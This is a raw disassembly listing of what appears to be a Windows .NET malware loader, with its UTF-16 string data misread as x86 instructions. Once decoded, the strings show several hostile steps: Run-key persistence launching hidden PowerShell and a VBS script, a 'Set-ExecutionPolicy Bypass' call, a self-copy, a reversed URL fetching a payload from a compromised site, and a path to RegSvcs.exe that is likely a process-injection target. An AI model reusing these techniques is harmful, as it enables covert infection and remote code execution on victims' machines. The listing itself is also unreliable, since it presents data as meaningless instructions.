1000314d:	5c                   	pop    %esp
1000314e:	00 4d 00             	add    %cl,0x0(%ebp)
10003151:	69 00 63 00 72 00    	imul   $0x720063,(%eax),%eax
10003157:	6f                   	outsl  %ds:(%esi),(%dx)
10003158:	00 73 00             	add    %dh,0x0(%ebx)
1000315b:	6f                   	outsl  %ds:(%esi),(%dx)
1000315c:	00 66 00             	add    %ah,0x0(%esi)
1000315f:	74 00                	je     0x10003161
10003161:	5c                   	pop    %esp
10003162:	00 57 00             	add    %dl,0x0(%edi)
10003165:	69 00 6e 00 64 00    	imul   $0x64006e,(%eax),%eax
1000316b:	6f                   	outsl  %ds:(%esi),(%dx)
1000316c:	00 77 00             	add    %dh,0x0(%edi)
1000316f:	73 00                	jae    0x10003171
10003171:	5c                   	pop    %esp
10003172:	00 43 00             	add    %al,0x0(%ebx)
10003175:	75 00                	jne    0x10003177
10003177:	72 00                	jb     0x10003179
10003179:	72 00                	jb     0x1000317b
1000317b:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
1000317f:	74 00                	je     0x10003181
10003181:	56                   	push   %esi
10003182:	00 65 00             	add    %ah,0x0(%ebp)
10003185:	72 00                	jb     0x10003187
10003187:	73 00                	jae    0x10003189
10003189:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
1000318f:	5c                   	pop    %esp
10003190:	00 52 00             	add    %dl,0x0(%edx)
10003193:	75 00                	jne    0x10003195
10003195:	6e                   	outsb  %ds:(%esi),(%dx)
10003196:	00 22                	add    %ah,(%edx)
10003198:	00 20                	add    %ah,(%eax)
1000319a:	00 2d 00 4e 00 61    	add    %ch,0x61004e00
100031a0:	00 6d 00             	add    %ch,0x0(%ebp)
100031a3:	65 00 20             	add    %ah,%gs:(%eax)
100031a6:	00 22                	add    %ah,(%edx)
100031a8:	00 01                	add    %al,(%ecx)
100031aa:	65 22 00             	and    %gs:(%eax),%al
100031ad:	20 00                	and    %al,(%eax)
100031af:	2d 00 56 00 61       	sub    $0x61005600,%eax
100031b4:	00 6c 00 75          	add    %ch,0x75(%eax,%eax,1)
100031b8:	00 65 00             	add    %ah,0x0(%ebp)
100031bb:	20 00                	and    %al,(%eax)
100031bd:	22 00                	and    (%eax),%al
100031bf:	50                   	push   %eax
100031c0:	00 6f 00             	add    %ch,0x0(%edi)
100031c3:	77 00                	ja     0x100031c5
100031c5:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
100031c9:	73 00                	jae    0x100031cb
100031cb:	68 00 65 00 6c       	push   $0x6c006500
100031d0:	00 6c 00 2e          	add    %ch,0x2e(%eax,%eax,1)
100031d4:	00 65 00             	add    %ah,0x0(%ebp)
100031d7:	78 00                	js     0x100031d9
100031d9:	65 00 20             	add    %ah,%gs:(%eax)
100031dc:	00 2d 00 57 00 69    	add    %ch,0x69005700
100031e2:	00 6e 00             	add    %ch,0x0(%esi)
100031e5:	64 00 6f 00          	add    %ch,%fs:0x0(%edi)
100031e9:	77 00                	ja     0x100031eb
100031eb:	53                   	push   %ebx
100031ec:	00 74 00 79          	add    %dh,0x79(%eax,%eax,1)
100031f0:	00 6c 00 65          	add    %ch,0x65(%eax,%eax,1)
100031f4:	00 20                	add    %ah,(%eax)
100031f6:	00 68 00             	add    %ch,0x0(%eax)
100031f9:	69 00 64 00 64 00    	imul   $0x640064,(%eax),%eax
100031ff:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
10003203:	20 00                	and    %al,(%eax)
10003205:	22 00                	and    (%eax),%al
10003207:	22 00                	and    (%eax),%al
10003209:	26 00 20             	add    %ah,%es:(%eax)
1000320c:	00 27                	add    %ah,(%edi)
1000320e:	00 01                	add    %al,(%ecx)
10003210:	69 78 00 78 00 32 00 	imul   $0x320078,0x0(%eax),%edi
10003217:	2e 00 76 00          	add    %dh,%cs:0x0(%esi)
1000321b:	62 00                	bound  %eax,(%eax)
1000321d:	73 00                	jae    0x1000321f
1000321f:	27                   	daa
10003220:	00 20                	add    %ah,(%eax)
10003222:	00 22                	add    %ah,(%edx)
10003224:	00 22                	add    %ah,(%edx)
10003226:	00 22                	add    %ah,(%edx)
10003228:	00 20                	add    %ah,(%eax)
1000322a:	00 2d 00 50 00 72    	add    %ch,0x72005000
10003230:	00 6f 00             	add    %ch,0x0(%edi)
10003233:	70 00                	jo     0x10003235
10003235:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
10003239:	74 00                	je     0x1000323b
1000323b:	79 00                	jns    0x1000323d
1000323d:	54                   	push   %esp
1000323e:	00 79 00             	add    %bh,0x0(%ecx)
10003241:	70 00                	jo     0x10003243
10003243:	65 00 20             	add    %ah,%gs:(%eax)
10003246:	00 22                	add    %ah,(%edx)
10003248:	00 53 00             	add    %dl,0x0(%ebx)
1000324b:	74 00                	je     0x1000324d
1000324d:	72 00                	jb     0x1000324f
1000324f:	69 00 6e 00 67 00    	imul   $0x67006e,(%eax),%eax
10003255:	22 00                	and    (%eax),%al
10003257:	20 00                	and    %al,(%eax)
10003259:	2d 00 66 00 6f       	sub    $0x6f006600,%eax
1000325e:	00 72 00             	add    %dh,0x0(%edx)
10003261:	63 00                	arpl   %eax,(%eax)
10003263:	65 00 3b             	add    %bh,%gs:(%ebx)
10003266:	00 20                	add    %ah,(%eax)
10003268:	00 7b 00             	add    %bh,0x0(%ebx)
1000326b:	24 00                	and    $0x0,%al
1000326d:	74 00                	je     0x1000326f
1000326f:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
10003273:	74 00                	je     0x10003275
10003275:	65 00 7d 00          	add    %bh,%gs:0x0(%ebp)
10003279:	01 0f                	add    %ecx,(%edi)
1000327b:	78 00                	js     0x1000327d
1000327d:	78 00                	js     0x1000327f
1000327f:	31 00                	xor    %eax,(%eax)
10003281:	2e 00 70 00          	add    %dh,%cs:0x0(%eax)
10003285:	73 00                	jae    0x10003287
10003287:	31 00                	xor    %eax,(%eax)
10003289:	00 80 99 70 00 6f    	add    %al,0x6f007099(%eax)
1000328f:	00 77 00             	add    %dh,0x0(%edi)
10003292:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
10003296:	73 00                	jae    0x10003298
10003298:	68 00 65 00 6c       	push   $0x6c006500
1000329d:	00 6c 00 2e          	add    %ch,0x2e(%eax,%eax,1)
100032a1:	00 65 00             	add    %ah,0x0(%ebp)
100032a4:	78 00                	js     0x100032a6
100032a6:	65 00 20             	add    %ah,%gs:(%eax)
100032a9:	00 53 00             	add    %dl,0x0(%ebx)
100032ac:	65 00 74 00 2d       	add    %dh,%gs:0x2d(%eax,%eax,1)
100032b1:	00 45 00             	add    %al,0x0(%ebp)
100032b4:	78 00                	js     0x100032b6
100032b6:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
100032ba:	75 00                	jne    0x100032bc
100032bc:	74 00                	je     0x100032be
100032be:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
100032c4:	50                   	push   %eax
100032c5:	00 6f 00             	add    %ch,0x0(%edi)
100032c8:	6c                   	insb   (%dx),%es:(%edi)
100032c9:	00 69 00             	add    %ch,0x0(%ecx)
100032cc:	63 00                	arpl   %eax,(%eax)
100032ce:	79 00                	jns    0x100032d0
100032d0:	20 00                	and    %al,(%eax)
100032d2:	42                   	inc    %edx
100032d3:	00 79 00             	add    %bh,0x0(%ecx)
100032d6:	70 00                	jo     0x100032d8
100032d8:	61                   	popa
100032d9:	00 73 00             	add    %dh,0x0(%ebx)
100032dc:	73 00                	jae    0x100032de
100032de:	20 00                	and    %al,(%eax)
100032e0:	2d 00 53 00 63       	sub    $0x63005300,%eax
100032e5:	00 6f 00             	add    %ch,0x0(%edi)
100032e8:	70 00                	jo     0x100032ea
100032ea:	65 00 20             	add    %ah,%gs:(%eax)
100032ed:	00 50 00             	add    %dl,0x0(%eax)
100032f0:	72 00                	jb     0x100032f2
100032f2:	6f                   	outsl  %ds:(%esi),(%dx)
100032f3:	00 63 00             	add    %ah,0x0(%ebx)
100032f6:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
100032fa:	73 00                	jae    0x100032fc
100032fc:	20 00                	and    %al,(%eax)
100032fe:	3b 00                	cmp    (%eax),%eax
10003300:	20 00                	and    %al,(%eax)
10003302:	70 00                	jo     0x10003304
10003304:	6f                   	outsl  %ds:(%esi),(%dx)
10003305:	00 77 00             	add    %dh,0x0(%edi)
10003308:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
1000330c:	73 00                	jae    0x1000330e
1000330e:	68 00 65 00 6c       	push   $0x6c006500
10003313:	00 6c 00 20          	add    %ch,0x20(%eax,%eax,1)
10003317:	00 2d 00 66 00 69    	add    %ch,0x69006600
1000331d:	00 6c 00 65          	add    %ch,0x65(%eax,%eax,1)
10003321:	00 20                	add    %ah,(%eax)
10003323:	00 01                	add    %al,(%ecx)
10003325:	35 70 00 6f 00       	xor    $0x6f0070,%eax
1000332a:	77 00                	ja     0x1000332c
1000332c:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
10003330:	73 00                	jae    0x10003332
10003332:	68 00 65 00 6c       	push   $0x6c006500
10003337:	00 6c 00 2e          	add    %ch,0x2e(%eax,%eax,1)
1000333b:	00 65 00             	add    %ah,0x0(%ebp)
1000333e:	78 00                	js     0x10003340
10003340:	65 00 20             	add    %ah,%gs:(%eax)
10003343:	00 43 00             	add    %al,0x0(%ebx)
10003346:	6f                   	outsl  %ds:(%esi),(%dx)
10003347:	00 70 00             	add    %dh,0x0(%eax)
1000334a:	79 00                	jns    0x1000334c
1000334c:	2d 00 49 00 74       	sub    $0x74004900,%eax
10003351:	00 65 00             	add    %ah,0x0(%ebp)
10003354:	6d                   	insl   (%dx),%es:(%edi)
10003355:	00 20                	add    %ah,(%eax)
10003357:	00 27                	add    %ah,(%edi)
10003359:	00 01                	add    %al,(%ecx)
1000335b:	21 27                	and    %esp,(%edi)
1000335d:	00 20                	add    %ah,(%eax)
1000335f:	00 2d 00 44 00 65    	add    %ch,0x65004400
10003365:	00 73 00             	add    %dh,0x0(%ebx)
10003368:	74 00                	je     0x1000336a
1000336a:	69 00 6e 00 61 00    	imul   $0x61006e,(%eax),%eax
10003370:	74 00                	je     0x10003372
10003372:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
10003378:	20 00                	and    %al,(%eax)
1000337a:	27                   	daa
1000337b:	00 01                	add    %al,(%ecx)
1000337d:	03 27                	add    (%edi),%esp
1000337f:	00 01                	add    %al,(%ecx)
10003381:	53                   	push   %ebx
10003382:	53                   	push   %ebx
10003383:	00 65 00             	add    %ah,0x0(%ebp)
10003386:	74 00                	je     0x10003388
10003388:	20 00                	and    %al,(%eax)
1000338a:	4b                   	dec    %ebx
1000338b:	00 61 00             	add    %ah,0x0(%ecx)
1000338e:	48                   	dec    %eax
1000338f:	00 75 00             	add    %dh,0x0(%ebp)
10003392:	63 00                	arpl   %eax,(%eax)
10003394:	20 00                	and    %al,(%eax)
10003396:	3d 00 20 00 43       	cmp    $0x43002000,%eax
1000339b:	00 72 00             	add    %dh,0x0(%edx)
1000339e:	65 00 61 00          	add    %ah,%gs:0x0(%ecx)
100033a2:	74 00                	je     0x100033a4
100033a4:	65 00 4f 00          	add    %cl,%gs:0x0(%edi)
100033a8:	62 00                	bound  %eax,(%eax)
100033aa:	6a 00                	push   $0x0
100033ac:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
100033b0:	74 00                	je     0x100033b2
100033b2:	28 00                	sub    %al,(%eax)
100033b4:	22 00                	and    (%eax),%al
100033b6:	57                   	push   %edi
100033b7:	00 73 00             	add    %dh,0x0(%ebx)
100033ba:	63 00                	arpl   %eax,(%eax)
100033bc:	72 00                	jb     0x100033be
100033be:	69 00 70 00 74 00    	imul   $0x740070,(%eax),%eax
100033c4:	2e 00 73 00          	add    %dh,%cs:0x0(%ebx)
100033c8:	68 00 65 00 6c       	push   $0x6c006500
100033cd:	00 6c 00 22          	add    %ch,0x22(%eax,%eax,1)
100033d1:	00 29                	add    %ch,(%ecx)
100033d3:	00 00                	add    %al,(%eax)
100033d5:	80 9f 0d 00 0a 00 4b 	sbbb   $0x4b,0xa000d(%edi)
100033dc:	00 61 00             	add    %ah,0x0(%ecx)
100033df:	48                   	dec    %eax
100033e0:	00 75 00             	add    %dh,0x0(%ebp)
100033e3:	63 00                	arpl   %eax,(%eax)
100033e5:	2e 00 72 00          	add    %dh,%cs:0x0(%edx)
100033e9:	75 00                	jne    0x100033eb
100033eb:	6e                   	outsb  %ds:(%esi),(%dx)
100033ec:	00 20                	add    %ah,(%eax)
100033ee:	00 22                	add    %ah,(%edx)
100033f0:	00 70 00             	add    %dh,0x0(%eax)
100033f3:	6f                   	outsl  %ds:(%esi),(%dx)
100033f4:	00 77 00             	add    %dh,0x0(%edi)
100033f7:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
100033fb:	73 00                	jae    0x100033fd
100033fd:	68 00 65 00 6c       	push   $0x6c006500
10003402:	00 6c 00 20          	add    %ch,0x20(%eax,%eax,1)
10003406:	00 2d 00 57 00 69    	add    %ch,0x69005700
1000340c:	00 6e 00             	add    %ch,0x0(%esi)
1000340f:	64 00 6f 00          	add    %ch,%fs:0x0(%edi)
10003413:	77 00                	ja     0x10003415
10003415:	53                   	push   %ebx
10003416:	00 74 00 79          	add    %dh,0x79(%eax,%eax,1)
1000341a:	00 6c 00 65          	add    %ch,0x65(%eax,%eax,1)
1000341e:	00 20                	add    %ah,(%eax)
10003420:	00 68 00             	add    %ch,0x0(%eax)
10003423:	69 00 64 00 64 00    	imul   $0x640064,(%eax),%eax
10003429:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
1000342d:	20 00                	and    %al,(%eax)
1000342f:	2d 00 63 00 6f       	sub    $0x6f006300,%eax
10003434:	00 6d 00             	add    %ch,0x0(%ebp)
10003437:	6d                   	insl   (%dx),%es:(%edi)
10003438:	00 61 00             	add    %ah,0x0(%ecx)
1000343b:	6e                   	outsb  %ds:(%esi),(%dx)
1000343c:	00 64 00 20          	add    %ah,0x20(%eax,%eax,1)
10003440:	00 77 00             	add    %dh,0x0(%edi)
10003443:	73 00                	jae    0x10003445
10003445:	63 00                	arpl   %eax,(%eax)
10003447:	72 00                	jb     0x10003449
10003449:	69 00 70 00 74 00    	imul   $0x740070,(%eax),%eax
1000344f:	2e 00 65 00          	add    %ah,%cs:0x0(%ebp)
10003453:	78 00                	js     0x10003455
10003455:	65 00 20             	add    %ah,%gs:(%eax)
10003458:	00 2f                	add    %ch,(%edi)
1000345a:	00 2f                	add    %ch,(%edi)
1000345c:	00 62 00             	add    %ah,0x0(%edx)
1000345f:	20 00                	and    %al,(%eax)
10003461:	2f                   	das
10003462:	00 2f                	add    %ch,(%edi)
10003464:	00 6e 00             	add    %ch,0x0(%esi)
10003467:	6f                   	outsl  %ds:(%esi),(%dx)
10003468:	00 6c 00 6f          	add    %ch,0x6f(%eax,%eax,1)
1000346c:	00 67 00             	add    %ah,0x0(%edi)
1000346f:	6f                   	outsl  %ds:(%esi),(%dx)
10003470:	00 20                	add    %ah,(%eax)
10003472:	00 27                	add    %ah,(%edi)
10003474:	00 01                	add    %al,(%ecx)
10003476:	19 27                	sbb    %esp,(%edi)
10003478:	00 22                	add    %ah,(%edx)
1000347a:	00 20                	add    %ah,(%eax)
1000347c:	00 2c 00             	add    %ch,(%eax,%eax,1)
1000347f:	30 00                	xor    %al,(%eax)
10003481:	2c 00                	sub    $0x0,%al
10003483:	20 00                	and    %al,(%eax)
10003485:	66 00 61 00          	data16 add %ah,0x0(%ecx)
10003489:	6c                   	insb   (%dx),%es:(%edi)
1000348a:	00 73 00             	add    %dh,0x0(%ebx)
1000348d:	65 00 01             	add    %al,%gs:(%ecx)
10003490:	0f 78 00             	vmread %eax,(%eax)
10003493:	78 00                	js     0x10003495
10003495:	32 00                	xor    (%eax),%al
10003497:	2e 00 76 00          	add    %dh,%cs:0x0(%esi)
1000349b:	62 00                	bound  %eax,(%eax)
1000349d:	73 00                	jae    0x1000349f
1000349f:	00 03                	add    %al,(%ebx)
100034a1:	33 00                	xor    (%eax),%eax
100034a3:	00 80 a7 74 00 78    	add    %al,0x780074a7(%eax)
100034a9:	00 74 00 2e          	add    %dh,0x2e(%eax,%eax,1)
100034ad:	00 65 00             	add    %ah,0x0(%ebp)
100034b0:	50                   	push   %eax
100034b1:	00 6c 00 6c          	add    %ch,0x6c(%eax,%eax,1)
100034b5:	00 61 00             	add    %ah,0x0(%ecx)
100034b8:	46                   	inc    %esi
100034b9:	00 79 00             	add    %bh,0x0(%ecx)
100034bc:	6b 00 53             	imul   $0x53,(%eax),%eax
100034bf:	00 2f                	add    %ch,(%edi)
100034c1:	00 39                	add    %bh,(%ecx)
100034c3:	00 30                	add    %dh,(%eax)
100034c5:	00 2f                	add    %ch,(%edi)
100034c7:	00 34 00             	add    %dh,(%eax,%eax,1)
100034ca:	32 00                	xor    (%eax),%al
100034cc:	30 00                	xor    %al,(%eax)
100034ce:	32 00                	xor    (%eax),%al
100034d0:	2f                   	das
100034d1:	00 73 00             	add    %dh,0x0(%ebx)
100034d4:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
100034d8:	6f                   	outsl  %ds:(%esi),(%dx)
100034d9:	00 6c 00 70          	add    %ch,0x70(%eax,%eax,1)
100034dd:	00 75 00             	add    %dh,0x0(%ebp)
100034e0:	2f                   	das
100034e1:	00 74 00 6e          	add    %dh,0x6e(%eax,%eax,1)
100034e5:	00 65 00             	add    %ah,0x0(%ebp)
100034e8:	74 00                	je     0x100034ea
100034ea:	6e                   	outsb  %ds:(%esi),(%dx)
100034eb:	00 6f 00             	add    %ch,0x0(%edi)
100034ee:	63 00                	arpl   %eax,(%eax)
100034f0:	2d 00 70 00 77       	sub    $0x77007000,%eax
100034f5:	00 2f                	add    %ch,(%edi)
100034f7:	00 70 00             	add    %dh,0x0(%eax)
100034fa:	77 00                	ja     0x100034fc
100034fc:	2f                   	das
100034fd:	00 6d 00             	add    %ch,0x0(%ebp)
10003500:	6f                   	outsl  %ds:(%esi),(%dx)
10003501:	00 63 00             	add    %ah,0x0(%ebx)
10003504:	2e 00 61 00          	add    %ah,%cs:0x0(%ecx)
10003508:	69 00 62 00 6d 00    	imul   $0x6d0062,(%eax),%eax
1000350e:	6f                   	outsl  %ds:(%esi),(%dx)
1000350f:	00 6c 00 6f          	add    %ch,0x6f(%eax,%eax,1)
10003513:	00 63 00             	add    %ah,0x0(%ebx)
10003516:	61                   	popa
10003517:	00 74 00 61          	add    %dh,0x61(%eax,%eax,1)
1000351b:	00 69 00             	add    %ch,0x0(%ecx)
1000351e:	64 00 65 00          	add    %ah,%fs:0x0(%ebp)
10003522:	6d                   	insl   (%dx),%es:(%edi)
10003523:	00 6e 00             	add    %ch,0x0(%esi)
10003526:	69 00 61 00 74 00    	imul   $0x740061,(%eax),%eax
1000352c:	72 00                	jb     0x1000352e
1000352e:	65 00 6c 00 61       	add    %ch,%gs:0x61(%eax,%eax,1)
10003533:	00 2e                	add    %ch,(%esi)
10003535:	00 77 00             	add    %dh,0x0(%edi)
10003538:	77 00                	ja     0x1000353a
1000353a:	77 00                	ja     0x1000353c
1000353c:	2f                   	das
1000353d:	00 2f                	add    %ch,(%edi)
1000353f:	00 3a                	add    %bh,(%edx)
10003541:	00 73 00             	add    %dh,0x0(%ebx)
10003544:	70 00                	jo     0x10003546
10003546:	74 00                	je     0x10003548
10003548:	74 00                	je     0x1000354a
1000354a:	68 00 01 07 42       	push   $0x42070100
1000354f:	30 42 30             	xor    %al,0x30(%edx)
10003552:	42                   	inc    %edx
10003553:	30 01                	xor    %al,(%ecx)
10003555:	03 41 00             	add    0x0(%ecx),%eax
10003558:	00 11                	add    %dl,(%ecx)
1000355a:	70 00                	jo     0x1000355c
1000355c:	61                   	popa
1000355d:	00 73 00             	add    %dh,0x0(%ebx)
10003560:	74 00                	je     0x10003562
10003562:	65 00 62 00          	add    %ah,%gs:0x0(%edx)
10003566:	69 00 6e 00 00 45    	imul   $0x4500006e,(%eax),%eax
1000356c:	6b 00 72             	imul   $0x72,(%eax),%eax
1000356f:	00 6f 00             	add    %ch,0x0(%edi)
10003572:	77 00                	ja     0x10003574
10003574:	65 00 6d 00          	add    %ch,%gs:0x0(%ebp)
10003578:	61                   	popa
10003579:	00 72 00             	add    %dh,0x0(%edx)
1000357c:	46                   	inc    %esi
1000357d:	00 5c 00 54          	add    %bl,0x54(%eax,%eax,1)
10003581:	00 45 00             	add    %al,0x0(%ebp)
10003584:	4e                   	dec    %esi
10003585:	00 2e                	add    %ch,(%esi)
10003587:	00 74 00 66          	add    %dh,0x66(%eax,%eax,1)
1000358b:	00 6f 00             	add    %ch,0x0(%edi)
1000358e:	73 00                	jae    0x10003590
10003590:	6f                   	outsl  %ds:(%esi),(%dx)
10003591:	00 72 00             	add    %dh,0x0(%edx)
10003594:	63 00                	arpl   %eax,(%eax)
10003596:	69 00 4d 00 5c 00    	imul   $0x5c004d,(%eax),%eax
1000359c:	73 00                	jae    0x1000359e
1000359e:	77 00                	ja     0x100035a0
100035a0:	6f                   	outsl  %ds:(%esi),(%dx)
100035a1:	00 64 00 6e          	add    %ah,0x6e(%eax,%eax,1)
100035a5:	00 69 00             	add    %ch,0x0(%ecx)
100035a8:	57                   	push   %edi
100035a9:	00 5c 00 3a          	add    %bl,0x3a(%eax,%eax,1)
100035ad:	00 43 00             	add    %al,0x0(%ebx)
100035b0:	00 17                	add    %dl,(%edi)
100035b2:	39 00                	cmp    %eax,(%eax)
100035b4:	31 00                	xor    %eax,(%eax)
100035b6:	33 00                	xor    (%eax),%eax
100035b8:	30 00                	xor    %al,(%eax)
100035ba:	33 00                	xor    (%eax),%eax
100035bc:	2e 00 30             	add    %dh,%cs:(%eax)
100035bf:	00 2e                	add    %ch,(%esi)
100035c1:	00 34 00             	add    %dh,(%eax,%eax,1)
100035c4:	76 00                	jbe    0x100035c6
100035c6:	5c                   	pop    %esp
100035c7:	00 00                	add    %al,(%eax)
100035c9:	1b 53 00             	sbb    0x0(%ebx),%edx
100035cc:	75 00                	jne    0x100035ce
100035ce:	4c                   	dec    %esp
100035cf:	00 4f 00             	add    %cl,0x0(%edi)
100035d2:	59                   	pop    %ecx
100035d3:	00 55 00             	add    %dl,0x0(%ebp)
100035d6:	2e 00 4d 00          	add    %cl,%cs:0x0(%ebp)
100035da:	58                   	pop    %eax
100035db:	00 75 00             	add    %dh,0x0(%ebp)
100035de:	75 00                	jne    0x100035e0
100035e0:	4a                   	dec    %edx
100035e1:	00 62 00             	add    %ah,0x0(%edx)
100035e4:	00 0d 57 00 77 00    	add    %cl,0x770057
100035ea:	51                   	push   %ecx
100035eb:	00 54 00 5a          	add    %dl,0x5a(%eax,%eax,1)
100035ef:	00 63 00             	add    %ah,0x0(%ebx)
100035f2:	00 19                	add    %bl,(%ecx)
100035f4:	5c                   	pop    %esp
100035f5:	00 52 00             	add    %dl,0x0(%edx)
100035f8:	65 00 67 00          	add    %ah,%gs:0x0(%edi)
100035fc:	53                   	push   %ebx
100035fd:	00 76 00             	add    %dh,0x0(%esi)
10003600:	63 00                	arpl   %eax,(%eax)
10003602:	73 00                	jae    0x10003604
10003604:	2e 00 65 00          	add    %ah,%cs:0x0(%ebp)
10003608:	78 00                	js     0x1000360a
1000360a:	65 00 00             	add    %al,%gs:(%eax)
1000360d:	05 40 00 21 00       	add    $0x210040,%eax
10003612:	00 00                	add    %al,(%eax)
10003614:	58                   	pop    %eax
10003615:	0d be 05 e6 b1       	or     $0xb1e605be,%eax
1000361a:	85 ea                	test   %ebp,%edx
1000361c:	ef                   	out    %eax,(%dx)
1000361d:	61                   	popa
1000361e:	73 63                	jae    0x10003683
10003620:	2c 3a                	sub    $0x3a,%al
10003622:	28 1a                	sub    %bl,(%edx)
10003624:	00 08                	add    %cl,(%eax)
10003626:	b7 7a                	mov    $0x7a,%bh
10003628:	5c                   	pop    %esp
10003629:	56                   	push   %esi
1000362a:	19 34 e0             	sbb    %esi,(%eax,%eiz,8)
1000362d:	89 08                	mov    %ecx,(%eax)
1000362f:	b0 3f                	mov    $0x3f,%al
10003631:	5f                   	pop    %edi
10003632:	7f 11                	jg     0x10003645
10003634:	d5 0a                	aad    $0xa
10003636:	3a 03                	cmp    (%ebx),%al
10003638:	00 00                	add    %al,(%eax)
1000363a:	01 03                	add    %eax,(%ebx)
1000363c:	20 00                	and    %al,(%eax)
1000363e:	01 26                	add    %esp,(%esi)
10003640:	07                   	pop    %es
10003641:	1c 0e                	sbb    $0xe,%al
10003643:	0e                   	push   %cs
10003644:	12 09                	adc    (%ecx),%cl
10003646:	02 02                	add    (%edx),%al
10003648:	1d 12 0d 08 12       	sbb    $0x12080d12,%eax
1000364d:	0d 02 02 02 02       	or     $0x2020202,%eax
10003652:	02 0e                	add    (%esi),%cl
10003654:	0e                   	push   %cs
10003655:	12 11                	adc    (%ecx),%dl
10003657:	02 02                	add    (%edx),%al
10003659:	0e                   	push   %cs
1000365a:	12 15 0e 0e 12 15    	adc    0x15120e0e,%dl
10003660:	0e                   	push   %cs
10003661:	0e                   	push   %cs
10003662:	02 02                	add    (%edx),%al
10003664:	12 11                	adc    (%ecx),%dl
10003666:	04 20                	add    $0x20,%al
10003668:	01 02                	add    %eax,(%edx)
1000366a:	0e                   	push   %cs
1000366b:	05 00 00 1d 12       	add    $0x121d0000,%eax
10003670:	0d 03 20 00 0e       	or     $0xe002003,%eax
10003675:	02 06                	add    (%esi),%al
10003677:	0e                   	push   %cs
10003678:	04 20                	add    $0x20,%al
1000367a:	01 01                	add    %eax,(%ecx)
1000367c:	0e                   	push   %cs
1000367d:	03 00                	add    (%eax),%eax
1000367f:	00 0e                	add    %cl,(%esi)
10003681:	05 00 01 0e 1d       	add    $0x1d0e0100,%eax
10003686:	0e                   	push   %cs
10003687:	05 00 02 0e 0e       	add    $0xe0e0200,%eax
1000368c:	0e                   	push   %cs
1000368d:	05 00 02 01 0e       	add    $0xe010200,%eax
10003692:	0e                   	push   %cs
10003693:	06                   	push   %es
10003694:	00 03                	add    %al,(%ebx)
10003696:	0e                   	push   %cs
10003697:	0e                   	push   %cs
10003698:	0e                   	push   %cs
10003699:	0e                   	push   %cs
1000369a:	08 00                	or     %al,(%eax)
1000369c:	04 08                	add    $0x8,%al
1000369e:	0e                   	push   %cs
1000369f:	11 29                	adc    %ebp,(%ecx)
100036a1:	02 08                	add    (%eax),%cl
100036a3:	05 00 01 01 12       	add    $0x12010100,%eax
100036a8:	11 05 00 01 01 11    	adc    %eax,0x11010100
100036ae:	35 04 00 00 12       	xor    $0x12000004,%eax
100036b3:	39 05 20 01 01 12    	cmp    %eax,0x12010120
100036b9:	39 04 00             	cmp    %eax,(%eax,%eax,1)
100036bc:	01 0e                	add    %ecx,(%esi)
100036be:	0e                   	push   %cs
100036bf:	04 20                	add    $0x20,%al
100036c1:	01 0e                	add    %ecx,(%esi)
100036c3:	0e                   	push   %cs
100036c4:	05 20 02 0e 0e       	add    $0xe0e0220,%eax
100036c9:	0e                   	push   %cs
100036ca:	04 00                	add    $0x0,%al
100036cc:	00 12                	add    %dl,(%edx)
100036ce:	41                   	inc    %ecx
100036cf:	05 00 01 1d 05       	add    $0x51d0100,%eax
100036d4:	0e                   	push   %cs
100036d5:	06                   	push   %es
100036d6:	20 01                	and    %al,(%ecx)
100036d8:	12 49 1d             	adc    0x1d(%ecx),%cl
100036db:	05 05 20 01 12       	add    $0x12012005,%eax
100036e0:	4d                   	dec    %ebp
100036e1:	0e                   	push   %cs
100036e2:	05 20 01 12 51       	add    $0x51120120,%eax
100036e7:	0e                   	push   %cs
100036e8:	06                   	push   %es
100036e9:	20 02                	and    %al,(%edx)
100036eb:	1c 1c                	sbb    $0x1c,%al
100036ed:	1d 1c 08 00 03       	sbb    $0x300081c,%eax
100036f2:	11 59 1c             	adc    %ebx,0x1c(%ecx)
100036f5:	11 5d 1c             	adc    %ebx,0x1c(%ebp)
100036f8:	09 00                	or     %eax,(%eax)
100036fa:	06                   	push   %es
100036fb:	01 0e                	add    %ecx,(%esi)
100036fd:	0e                   	push   %cs
100036fe:	0e                   	push   %cs
100036ff:	0e                   	push   %cs
10003700:	0e                   	push   %cs
10003701:	0e                   	push   %cs
10003702:	02 06                	add    (%esi),%al
10003704:	1c 02                	sbb    $0x2,%al
10003706:	06                   	push   %es
10003707:	08 04 00             	or     %al,(%eax,%eax,1)
1000370a:	01 01                	add    %eax,(%ecx)
1000370c:	1c 05                	sbb    $0x5,%al
1000370e:	20 02                	and    %al,(%edx)
10003710:	01 1c 18             	add    %ebx,(%eax,%ebx,1)
10003713:	05 20 01 01 12       	add    $0x12010120,%eax
10003718:	65 04 20             	gs add $0x20,%al
1000371b:	00 12                	add    %dl,(%edx)
1000371d:	49                   	dec    %ecx
1000371e:	06                   	push   %es
1000371f:	00 02                	add    %al,(%edx)
10003721:	01 1c 12             	add    %ebx,(%edx,%edx,1)
10003724:	69 0b 07 05 1d 12    	imul   $0x121d0507,(%ebx),%ecx
1000372a:	51                   	push   %ecx
1000372b:	12 51 08             	adc    0x8(%ecx),%dl
1000372e:	12 51 08             	adc    0x8(%ecx),%dl
10003731:	05 20 00 1d 12       	add    $0x121d0020,%eax
10003736:	6d                   	insl   (%dx),%es:(%edi)
10003737:	07                   	pop    %es
10003738:	20 01                	and    %al,(%ecx)
1000373a:	1d 12 51 11 71       	sbb    $0x71115112,%eax
1000373f:	05 00 02 02 0e       	add    $0xe020200,%eax
10003744:	0e                   	push   %cs
10003745:	07                   	pop    %es
10003746:	00 02                	add    %al,(%edx)
10003748:	02 12                	add    (%edx),%dl
1000374a:	51                   	push   %ecx
1000374b:	12 51 05             	adc    0x5(%ecx),%dl
